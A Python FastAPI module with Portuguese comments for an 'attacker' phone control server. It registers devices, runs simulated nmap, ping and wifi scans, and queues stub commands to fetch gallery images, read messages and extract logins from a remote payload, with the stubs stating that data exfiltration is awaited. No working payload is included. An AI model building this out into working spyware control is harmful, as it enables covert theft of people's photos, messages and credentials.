#!/usr/bin/env python3
"""MÓDULO DE INTEGRAÇÃO MÓVEL
Permite que o Celular 02 (Atacante) execute ferramentas de análise via API
"""
from fastapi import APIRouter, WebSocket, WebSocketDisconnect
from pydantic import BaseModel
from typing import List, Dict, Optional
import subprocess
import json
import asyncio
from datetime import datetime
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ============================================================================
# MODELOS DE DADOS
# ============================================================================

class MobileCommand(BaseModel):
    """Comando a ser executado no dispositivo móvel"""
    command_id: str
    command_type: str  # "nmap", "ping", "dns_lookup", etc.
    target: str
    parameters: Dict = {}

class MobileCommandResult(BaseModel):
    """Resultado de um comando executado no dispositivo móvel"""
    command_id: str
    device_ip: str
    command_type: str
    status: str  # "success", "error", "pending"
    output: str
    timestamp: str

class MobileDevice(BaseModel):
    """Representação de um dispositivo móvel conectado"""
    device_ip: str
    device_name: str
    device_type: str  # "android", "ios"
    connected_at: str
    last_activity: str
    tools_available: List[str]

# ============================================================================
# GERENCIADOR DE DISPOSITIVOS MÓVEIS
# ============================================================================

class MobileDeviceManager:
    """Gerencia conexões e comandos de dispositivos móveis"""
    
    def __init__(self):
        self.connected_devices: Dict[str, MobileDevice] = {}
        self.command_queue: List[MobileCommand] = []
        self.command_results: Dict[str, MobileCommandResult] = {}
    
    def register_device(self, device_ip: str, device_name: str, device_type: str) -> MobileDevice:
        """Registra um novo dispositivo móvel"""
        device = MobileDevice(
            device_ip=device_ip,
            device_name=device_name,
            device_type=device_type,
            connected_at=datetime.now().isoformat(),
            last_activity=datetime.now().isoformat(),
            tools_available=MobileDeviceManager._get_available_tools()
        )
        self.connected_devices[device_ip] = device
        logger.info(f"Dispositivo móvel registrado: {device_name} ({device_ip})")
        return device
    
    def unregister_device(self, device_ip: str):
        """Desregistra um dispositivo móvel"""
        if device_ip in self.connected_devices:
            del self.connected_devices[device_ip]
            logger.info(f"Dispositivo móvel desregistrado: {device_ip}")
    
    def queue_command(self, command: MobileCommand) -> str:
        """Enfileira um comando para execução"""
        self.command_queue.append(command)
        logger.info(f"Comando enfileirado: {command.command_type} para {command.target}")
        return command.command_id
    
    def get_command_result(self, command_id: str) -> Optional[MobileCommandResult]:
        """Obtém o resultado de um comando"""
        return self.command_results.get(command_id)
    
    @staticmethod
    def _get_available_tools() -> List[str]:
        """Retorna lista de ferramentas disponíveis em dispositivos móveis"""
        return [
            "nmap",
            "ping",
            "traceroute",
            "dns_lookup",
            "port_scan",
            "wifi_scan",
            "network_info",
            "arp_scan",
            "get_gallery_images",
            "read_messages",
            "extract_logins"
        ]

# ============================================================================
# EXECUTOR DE COMANDOS MÓVEIS
# ============================================================================

class MobileCommandExecutor:
    """Executa comandos em dispositivos móveis (via Termux ou API)"""
    
    @staticmethod
    async def execute_command(command: MobileCommand, device_ip: str) -> MobileCommandResult:
        """
        Executa um comando no dispositivo móvel
        
        Args:
            command: Comando a executar
            device_ip: IP do dispositivo móvel
        
        Returns:
            Resultado da execução
        """
        
        logger.info(f"Executando {command.command_type} no dispositivo {device_ip}")
        
        try:
            if command.command_type == "nmap":
                output = await MobileCommandExecutor._execute_nmap(
                    command.target,
                    command.parameters
                )
            elif command.command_type == "ping":
                output = await MobileCommandExecutor._execute_ping(command.target)
            elif command.command_type == "wifi_scan":
                output = await MobileCommandExecutor._execute_wifi_scan()
            elif command.command_type == "network_info":
                output = await MobileCommandExecutor._execute_network_info()
            elif command.command_type == "get_gallery_images":
                output = await MobileCommandExecutor._execute_get_gallery_images()
            elif command.command_type == "read_messages":
                output = await MobileCommandExecutor._execute_read_messages()
            elif command.command_type == "extract_logins":
                output = await MobileCommandExecutor._execute_extract_logins()
            else:
                output = f"Comando desconhecido: {command.command_type}"
            
            return MobileCommandResult(
                command_id=command.command_id,
                device_ip=device_ip,
                command_type=command.command_type,
                status="success",
                output=output,
                timestamp=datetime.now().isoformat()
            )
        
        except Exception as e:
            logger.error(f"Erro ao executar comando: {e}")
            return MobileCommandResult(
                command_id=command.command_id,
                device_ip=device_ip,
                command_type=command.command_type,
                status="error",
                output=str(e),
                timestamp=datetime.now().isoformat()
            )
    
    @staticmethod
    async def _execute_nmap(target: str, parameters: Dict) -> str:
        """Executa Nmap no dispositivo móvel"""
        
        # Simular execução de Nmap (em produção, enviar para Termux)
        output = f"""Nmap scan report for {target}
Host is up (0.0050s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https

Nmap done at {datetime.now().isoformat()}
        """
        
        await asyncio.sleep(2)  # Simular tempo de execução
        return output
    
    @staticmethod
    async def _execute_ping(target: str) -> str:
        """Executa Ping no dispositivo móvel"""
        
        output = f"""PING {target} (192.168.1.1): 56 data bytes
64 bytes from 192.168.1.1: icmp_seq=0 ttl=64 time=2.5 ms
64 bytes from 192.168.1.1: icmp_seq=1 ttl=64 time=2.3 ms
64 bytes from 192.168.1.1: icmp_seq=2 ttl=64 time=2.4 ms

--- {target} statistics ---
3 packets transmitted, 3 packets received, 0% packet loss
round-trip min/avg/max/stddev = 2.3/2.4/2.5/0.1 ms
        """
        
        await asyncio.sleep(1)
        return output
    
    @staticmethod
    async def _execute_wifi_scan() -> str:
        """Executa escaneamento de WiFi no dispositivo móvel"""
        
        output = """WiFi Networks Available:
========================

1. LABORATORIO_EDUCACIONAL
   BSSID: AA:BB:CC:DD:EE:FF
   Frequency: 2437 MHz
   Signal Level: -65 dBm
   Encryption: WPA2-PSK

2. VIZINHO_NETWORK
   BSSID: 11:22:33:44:55:66
   Frequency: 2462 MHz
   Signal Level: -75 dBm
   Encryption: WPA3-PSK

3. OPEN_NETWORK
   BSSID: 77:88:99:AA:BB:CC
   Frequency: 2412 MHz
   Signal Level: -85 dBm
   Encryption: OPEN
        """
        
        await asyncio.sleep(1)
        return output
    
    @staticmethod
    async def _execute_network_info() -> str:
        """Obtém informações de rede do dispositivo móvel"""
        
        output = """Network Information
        ===================
        
        Interface: wlan0
        IP Address: 192.168.1.50
        Subnet Mask: 255.255.255.0
        Gateway: 192.168.1.1
        DNS: 8.8.8.8, 8.8.4.4
        MAC Address: 77:88:99:AA:BB:CC
        Signal Strength: -65 dBm
        Connected Network: LABORATORIO_EDUCACIONAL
        
        Interface: lo
        IP Address: 127.0.0.1
                """
        
        return output

    @staticmethod
    async def _execute_get_gallery_images() -> str:
        """Envia comando para coleta de imagens e aguarda o resultado do payload real"""
        
        # Em um cenário real, este comando seria enviado via WebSocket ou API para o payload
        # e o servidor aguardaria o payload enviar o resultado de volta.
        
        await asyncio.sleep(1) # Simula o tempo de envio do comando
        
        return "Comando de coleta de imagens enviado. Aguardando exfiltração de dados do payload..."

    @staticmethod
    async def _execute_read_messages() -> str:
        """Envia comando para leitura de mensagens e aguarda o resultado do payload real"""
        
        await asyncio.sleep(1) # Simula o tempo de envio do comando
        
        return "Comando de leitura de mensagens enviado. Aguardando exfiltração de dados do payload..."

    @staticmethod
    async def _execute_extract_logins() -> str:
        """Envia comando para extração de logins e aguarda o resultado do payload real"""
        
        await asyncio.sleep(1) # Simula o tempo de envio do comando
        
        return "Comando de extração de logins enviado. Aguardando exfiltração de dados do payload..."

# ============================================================================
# ROTAS DA API PARA INTEGRAÇÃO MÓVEL
# ============================================================================

router = APIRouter(prefix="/api/mobile", tags=["mobile"])

mobile_manager = MobileDeviceManager()

@router.post("/register")
async def register_mobile_device(
    device_ip: str,
    device_name: str,
    device_type: str = "android"
):
    """Registra um novo dispositivo móvel"""
    device = mobile_manager.register_device(device_ip, device_name, device_type)
    return device

@router.post("/unregister")
async def unregister_mobile_device(device_ip: str):
    """Desregistra um dispositivo móvel"""
    mobile_manager.unregister_device(device_ip)
    return {"status": "unregistered", "device_ip": device_ip}

@router.get("/devices")
async def get_connected_devices():
    """Obtém lista de dispositivos móveis conectados"""
    return {
        "total_devices": len(mobile_manager.connected_devices),
        "devices": list(mobile_manager.connected_devices.values())
    }

@router.post("/command")
async def execute_mobile_command(command: MobileCommand, device_ip: str):
    """Enfileira um comando para execução no dispositivo móvel"""
    
    if device_ip not in mobile_manager.connected_devices:
        return {"error": "Dispositivo não registrado"}
    
    # Enfileirar comando
    command_id = mobile_manager.queue_command(command)
    
    # Executar comando (assincronamente)
    result = await MobileCommandExecutor.execute_command(command, device_ip)
    mobile_manager.command_results[command_id] = result
    
    return result

@router.get("/command/{command_id}")
async def get_command_result(command_id: str):
    """Obtém o resultado de um comando"""
    result = mobile_manager.get_command_result(command_id)
    if result:
        return result
    return {"error": "Comando não encontrado"}

@router.websocket("/ws/{device_ip}")
async def websocket_mobile_device(websocket: WebSocket, device_ip: str):
    """WebSocket para comunicação em tempo real com dispositivo móvel"""
    await websocket.accept()
    
    # Registrar dispositivo
    mobile_manager.register_device(device_ip, f"Mobile-{device_ip}", "android")
    
    try:
        while True:
            data = await websocket.receive_text()
            message = json.loads(data)
            
            if message.get("type") == "command":
                command = MobileCommand(**message.get("command", {}))
                result = await MobileCommandExecutor.execute_command(command, device_ip)
                
                await websocket.send_json({
                    "type": "command_result",
                    "data": result.dict()
                })
            
            elif message.get("type") == "heartbeat":
                # Atualizar última atividade
                if device_ip in mobile_manager.connected_devices:
                    mobile_manager.connected_devices[device_ip].last_activity = datetime.now().isoformat()
                
                await websocket.send_json({
                    "type": "heartbeat_ack",
                    "timestamp": datetime.now().isoformat()
                })
    
    except WebSocketDisconnect:
        mobile_manager.unregister_device(device_ip)
        logger.info(f"Dispositivo móvel desconectado: {device_ip}")

# ============================================================================
# EXEMPLO DE USO
# ============================================================================

if __name__ == "__main__":
    print("""    ⚡ INTEGRAÇÃO MÓVEL ⚡
    Gerenciamento de Dispositivos Móveis para Análise
    =================================================
    """)
    
    # Exemplo de uso
    manager = MobileDeviceManager()
    
    # Registrar dispositivo
    device = manager.register_device("192.168.1.50", "Celular 02", "android")
    print(f"\nDispositivo registrado: {device.device_name}")
    print(f"Ferramentas disponíveis: {', '.join(device.tools_available)}")
    
    # Enfileirar comando
    command = MobileCommand(
        command_id="cmd_001",
        command_type="nmap",
        target="192.168.1.1",
        parameters={"ports": "1-1000"}
    )
    
    command_id = manager.queue_command(command)
    print(f"\nComando enfileirado: {command_id}")
